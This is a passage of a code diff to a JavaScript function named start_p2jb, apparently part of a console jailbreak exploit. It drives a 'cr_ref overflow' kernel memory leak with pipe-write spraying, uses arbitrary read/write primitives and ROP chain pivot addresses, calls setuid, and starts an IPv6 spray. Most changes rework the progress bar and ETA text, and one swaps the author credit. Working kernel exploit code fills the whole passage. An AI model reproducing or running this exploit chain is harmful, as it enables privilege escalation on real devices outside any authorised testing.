-                        if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
-                        const n = syscall(SYSCALL.write, BigInt(lw.wfd),
-                            chunkbuf, want);
-                        if (n > 0n && n <= BigInt(FEED_CHUNK)) lw.queued += n;
-                    }
-                }
-                if(!all_fed) {
-                    if (loop_cntr < 16) { // fill the pipeline quickly
-                        loop_cntr++;
-                        await js_sleep(5);
-                    } else {
-                        if (op_percent_cntr < 68) { // until 68% fill the pipeline in a 30 seconds period
-                            await js_sleep(29000);
-                            refresh_limit = 2;
-                        } else { // after 68% fill the pipeline in a 1 second period
-                            await js_sleep(1000);
-                            refresh_limit = 60;
-                        }
-                        refresh_cntr++;
-                        if (refresh_cntr >= refresh_limit) { // increase 2% each minute
-                            refresh_cntr = 0;
-                            op_percent_cntr += 2;
-                            if (op_percent_cntr > 99) op_percent_cntr = 99;
-                            let msg = "Working on cr_ref overflow... " + op_percent_cntr + "%";
-                            document.getElementById("progressBar").style.transform = "scaleX(" + op_percent_cntr / 100 + ")";
-                            document.getElementById("progressLabel").textContent = msg;
-                        }
-                    }
-                }
-            }
 
-            op_percent_cntr = 75;
-            let msg = "Working on cr_ref overflow... " + op_percent_cntr + "%";
-            document.getElementById("progressBar").style.transform = "scaleX(" + op_percent_cntr / 100 + ")";
-            document.getElementById("progressLabel").textContent = msg;
+                        let want = lw.normal - lw.queued;
+                        if (want > BigInt(FEED_CHUNK))
+                            want = BigInt(FEED_CHUNK);
+
+                        const n = syscall(
+                            SYSCALL.write,
+                            BigInt(lw.wfd),
+                            chunkbuf,
+                            want
+                        );
+
+                        if (n > 0n && n <= BigInt(FEED_CHUNK))
+                            lw.queued += n;
+                    }
+                }
+
+                const now = Date.now();
+
+                if (now - last_ui_update >= 5000) {
+                    last_ui_update = now;
+
+                    const elapsed_m =
+                        Math.floor((now - leak_start) / 60000);
+
+                    const pct =
+                        Math.min(99, elapsed_m * 2);
+
+                    const remaining_m =
+                        Math.max(0, eta_minutes - elapsed_m);
+
+                    document.getElementById("progressBar").style.transform =
+                        "scaleX(" + (pct / 100) + ")";
+
+                    document.getElementById("progressLabel").textContent =
+                        "cr_ref overflow... " +
+                        pct +
+                        "% (~" +
+                        remaining_m +
+                        "m remaining)";
+                }
+
+                await js_sleep(100);
+            }
 
             for (const lw of lws) {
                 while (true) {
-                    if (op_percent_cntr < 97) { // untill 97% just wait for the workers to empty pipeline as much as they can
-                        await js_sleep(30000);
-                        refresh_limit = 2;
-                    } else {
-                        write64(lw.finished, 0n);
-                        await js_sleep(1500);
-                        if (read64(lw.finished) === 0n) break;
-                        refresh_limit = 38;
-                    }
-                    refresh_cntr++;
-                    if (refresh_cntr >= refresh_limit) { // increase 2% each minute
-                        refresh_cntr = 0;
-                        op_percent_cntr += 2;
-                        if (op_percent_cntr > 99) op_percent_cntr = 99;
-                        let msg = "Working on cr_ref overflow... " + op_percent_cntr + "%";
-                        document.getElementById("progressBar").style.transform = "scaleX(" + op_percent_cntr / 100 + ")";
-                        document.getElementById("progressLabel").textContent = msg;
-                    }
+                    write64(lw.finished, 0n);
+
+                    await js_sleep(1500);
+
+                    if (read64(lw.finished) === 0n)
+                        break;
+
+                    const elapsed_m =
+                        Math.floor((Date.now() - leak_start) / 60000);
+
+                    const pct =
+                        Math.min(99, elapsed_m * 2);
+
+                    const remaining_m =
+                        Math.max(0, eta_minutes - elapsed_m);
+
+                    document.getElementById("progressBar").style.transform =
+                        "scaleX(" + (pct / 100) + ")";
+
+                    document.getElementById("progressLabel").textContent =
+                        "cr_ref overflow... " +
+                        pct +
+                        "% (~" +
+                        remaining_m +
+                        "m remaining)";
                 }
             }
 
             for (const lw of lws) {
                 write64(lw.chain.pivotAddr, lw.chain.exitAddr);
                 write64(lw.finished, 0n);
-                syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, 1n);
+
+                syscall(
+                    SYSCALL.write,
+                    BigInt(lw.wfd),
+                    chunkbuf,
+                    1n
+                );
             }
+
             for (const lw of lws) {
                 const dl = Date.now() + 15000;
-                while (read64(lw.finished) !== EXIT_MARK && Date.now() < dl)
+
+                while (
+                    read64(lw.finished) !== EXIT_MARK &&
+                    Date.now() < dl
+                ) {
                     await js_sleep(50);
+                }
+
                 syscall(SYSCALL.close, BigInt(lw.rfd));
                 syscall(SYSCALL.close, BigInt(lw.wfd));
             }
 
+            document.getElementById("progressBar").style.transform =
+                "scaleX(0.99)";
+
+            document.getElementById("progressLabel").textContent =
+                "cr_ref overflow... 99%";
+
+            const leak_elapsed_m =
+                Math.floor((Date.now() - leak_start) / 60000);
+
+            document.getElementById("progressBar").style.transform =
+                "scaleX(1)";
+
+            document.getElementById("progressLabel").textContent =
+                "Leak complete in " +
+                leak_elapsed_m +
+                "m. Starting next stages...";
+
             for (let i = 0; i < free_fds_num; i++) {
                 const fd = new_free_fd();
-                if (fd === 0xffffffffffffffffn) fail("free-fd creation failed at i=" + i);
+
+                if (fd === 0xffffffffffffffffn)
+                    fail("free-fd creation failed at i=" + i);
+
                 S.free_fds.push(Number(fd));
             }
+
             syscall(SYSCALL.setuid, 1n);
 
             await js_sleep(5000);
@@ -2327,7 +2443,7 @@ async function start_p2jb() {
         }
 
         //send_notification(p2jb_version + "\nport by matem6");
-        await log(p2jb_version + " by matem6", "#ffe600");
+        await log(p2jb_version + " by dotnesia", "#ffe600");
 
         {
 
@@ -2382,7 +2498,7 @@ async function start_p2jb() {
             case 1: eta_minutes = 120; break;
             case 2: eta_minutes = 90; break;
             case 3: eta_minutes = 60; break;
-            case 4: eta_minutes = 48; break;
+            case 4: eta_minutes = 50; break;
             default: eta_minutes = Math.round(48 * 4 / leak_nw); break;
         }
         const eta_str = eta_minutes < 60
@@ -2393,15 +2509,20 @@ async function start_p2jb() {
         const fmt_hm = d =>
             String(d.getHours()).padStart(2, '0') + ':' +
             String(d.getMinutes()).padStart(2, '0');
+
         const t_start = new Date();
-        const t_eta = new Date(t_start.getTime() + eta_minutes * 60000);
-        //await ulog("host OK - starting " + leak_nw + "-core leak at " +
-        //    fmt_hm(t_start) + ", ETA stage0 ~" + fmt_hm(t_eta) +
-        //    " (" + eta_str + "); no further log output until then " +
-        //    "(this is normal, do not interrupt)");
-        updateProgressBar(0, "Working on cr_ref overflow... 0%");
+
+        // SAFEGUARD: Ensure eta_minutes is a valid number before adding time
+        const safe_eta_mins = Number(eta_minutes) || 50;
+        const t_eta = new Date(t_start.getTime() + safe_eta_mins * 60000);
+
+        // Use a fallback string if eta_str is empty or undefined
+        const safe_eta_str = (typeof eta_str !== 'undefined' && eta_str) ? eta_str : (safe_eta_mins + "m");
+
+        updateProgressBar(0, "cr_ref overflow... 0%");
+
         await ulog("starting " + leak_nw + "-core leak at " +
-            fmt_hm(t_start) + ", ETA stage0 ~" + fmt_hm(t_eta) + " (" + eta_str + ")");
+            fmt_hm(t_start) + ", ETA stage0 ~" + fmt_hm(t_eta) + " (" + safe_eta_str + ")");
 
         setup_workers(S);
         setup_ipv6_spray(S);
